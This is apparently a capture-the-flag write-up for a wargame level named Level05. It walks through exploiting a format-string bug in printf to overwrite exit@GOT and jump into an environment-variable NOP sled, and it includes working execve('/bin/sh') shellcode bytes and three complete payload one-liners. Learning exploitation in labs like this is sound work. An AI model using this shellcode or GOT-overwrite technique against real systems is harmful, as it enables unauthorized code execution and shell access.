Level05
-------

1) Checking the program
-----------------------

After checking the main() function: we found that the program convert characters from uppercase to lowercase and print the buffer with printf()

   0x08048507 <+195>:	call   0x8048340 <printf@plt>

printf() is not protected 

Our input is treated as a format string

So you can use:

%x → read memory
%n → write memory


2) Let's find the index of the bufer in the stack:
-------------------------------------------------


level05@OverRide:~$ ./level05 
AAAA %x %x %x %x %x %x %x %x %x %x %x %x
aaaa 64 f7fcfac0 f7ec3af9 fffed6cf fffed6ce 0 ffffffff fffed754 f7fdb000 61616161 20782520 25207825


61616161 = "aaaa" it's our input because the program converts "AAAA" to "aaaa"

So the offset is 10 



3) Let's control execution  
--------------------------

Overwrite exit → redirect execution

Means : when the program runs exit(0); we overwrite exit@GOT → our address

Instead of using stack (unstable) we use environment variable because :
It's stored at high memory (0xffffxxxx)
It's stable between runs
It can hold large data (NOP sled)



4) Let's inject our shellcode :

execve("/bin/sh", NULL, NULL); 

we inject the command :

export PAYLOAD=$(python -c 'print "\x90" * 1000 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"')


NOP = No Operation in assembly : \x90 
means : do nothing, go to next instruction

It's useful because memory might be:

0xffff0000 → NOP
0xffff0100 → NOP
0xffff0200 → NOP
0xffff0300 → shellcode
jump → NOP → NOP → NOP → shellcode → /bin/sh




5) Let's get the address of exit()
----------------------------------



level05@OverRide:~$ objdump -R ./level05

080497e0 R_386_JUMP_SLOT   exit


6) 

Prepare write locations
exit@GOT     = 0x080497e0  
exit@GOT+2   = 0x080497e2  



7) 

                    ┌──────────────────────────────┐
                    │        PROGRAM FLOW          │
                    └─────────────┬────────────────┘
                                  │
                                  ▼
                           exit() is called
                                  │
                                  ▼
        (we overwrote exit@GOT with our address)
                                  │
                                  ▼
                      jump → 0xffffdc64
                                  │
                                  ▼
        ┌──────────────────────────────────────────┐
        │            ENVIRONMENT (PAYLOAD)         │
        ├──────────────────────────────────────────┤
        │ 0xffffdba4 → NOP                         │
        │ 0xffffdb.. → NOP                         │
        │ 0xffffdc64 → NOP   ◄─── landing point    │
        │ 0xffffdc.. → NOP                         │
        │ 0xffffdd.. → NOP                         │
        │ 0xffffdf8c → SHELLCODE (/bin/sh)         │
        └──────────────────────────────────────────┘
                                  │
                                  ▼
                 NOP → NOP → NOP → NOP → SHELLCODE
                                                  │
                                                  ▼
                                            /bin/sh opened



8) START address of our PAYLOAD in memory

(gdb) break main
Breakpoint 1 at 0x8048449
(gdb) run
Starting program: /home/users/level05/level05 

Breakpoint 1, 0x08048449 in main ()
(gdb) p/x (char *)getenv("PAYLOAD")
$1 = 0xffffdba4
(gdb) 

9) What is inside PAYLOAD ?

"\x90" * 1000 + shellcode

10)  What does “1000 NOPs” mean in memory

1000 bytes = 1000 addresses

11) Compute the END of NOP sled 

Start  => 0xffffdba4
Size   => 1000 = 0x3E8
End of NOP sled => 0xffffdba4 + 0x3E8 = 0xffffdf8c


12) Where is the shellcode ?

Right after NOP sled  => 0xffffdf8c → shellcode starts

solution 1) 

(python -c 'print "\xe0\x97\x04\x08"+"\xe2\x97\x04\x08"+"%56412c"+"%10$hn"+"%9115c"+"%11$hn"' ;cat -) | ./level05
solution 2) 

(python -c 'print "\xe0\x97\x04\x08"+"\xe2\x97\x04\x08"+"%56312c"+"%10$hn"+"%9215c"+"%11$hn"' ;cat -) | ./level05

solution 3)

(python -c 'print "\xe0\x97\x04\x08"+"\xe2\x97\x04\x08"+"%56504c"+"%10$hn"+"%9023c"+"%11$hn"' ;cat -) | ./level05
